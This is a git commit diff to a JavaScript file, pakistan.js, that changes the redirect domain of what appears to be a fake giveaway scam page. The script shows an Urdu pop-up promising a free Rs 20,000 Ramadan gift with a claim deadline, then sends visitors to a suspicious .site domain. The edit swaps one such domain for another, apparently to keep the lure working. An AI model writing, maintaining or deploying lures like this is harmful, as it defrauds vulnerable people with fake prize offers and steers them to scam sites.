2fb876920297243675b1fbed6cbb229860d865a9
usorondo28 <chimes-aye-6p@icloud.com>
2026-02-21 18:35:23 +0100

    Update pakistan.js

--- pakistan.js
+++ pakistan.js
@@ -3,5 +3,5 @@
 var password = 'واپس لے لو Rs20,000'
 password=prompt('مبارک ہو! 20,000 روپے مفت رامادم حاصل کریں اب آخری تاریخ 30 مارچ 2026، براہ کرم دعوی کرنے کے لیے OK دبائیں   ','واپس لے لو Rs20,000');
 if (password != 'واپس لے لو Rs20,000') {
-location.href='https://www.rnjhorh.site/ramadan-Rs20000';
+location.href='https://www.pstikang.site/ramadan-Rs20000';
 }
